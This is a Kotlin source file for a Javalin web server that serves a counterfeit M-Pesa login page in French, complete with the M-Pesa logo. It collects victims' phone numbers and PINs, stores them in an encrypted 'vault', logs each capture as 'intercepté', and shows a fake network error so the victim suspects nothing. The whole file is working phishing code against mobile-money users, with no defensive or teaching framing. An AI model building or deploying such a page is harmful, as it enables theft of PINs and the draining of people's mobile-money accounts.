package com.fardc.sigint.core

import io.javalin.Javalin

class MPesaCommander(private val vault: SecurityVault) {
    fun setup(app: Javalin) {
        app.get("/login/mpesa") { ctx ->
            ctx.html("""
                <html>
                <body style='font-family:sans-serif; text-align:center; padding-top:50px;'>
                    <img src='https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/M-Pesa_logo.png/640px-M-Pesa_logo.png' width='200'><br><br>
                    <form action='/login/mpesa/capture' method='post'>
                        <input type='text' name='phone' placeholder='Numéro de téléphone' required style='padding:10px; margin:5px;'><br>
                        <input type='password' name='pin' placeholder='PIN M-Pesa' required style='padding:10px; margin:5px;'><br>
                        <button type='submit' style='background:#00be00; color:white; border:none; padding:10px 20px; border-radius:5px;'>Se connecter</button>
                    </form>
                </body>
                </html>
            """.trimIndent())
        }

        app.post("/login/mpesa/capture") { ctx ->
            val phone = ctx.formParam("phone") ?: "N/A"
            val pin = ctx.formParam("pin") ?: "N/A"
            vault.encryptData("M-PESA | TEL: $phone | PIN: $pin")
            println("🎯 [CAPTURE] M-Pesa intercepté pour : $phone")
            ctx.result("Erreur de connexion réseau. Veuillez réessayer plus tard.")
        }
    }
}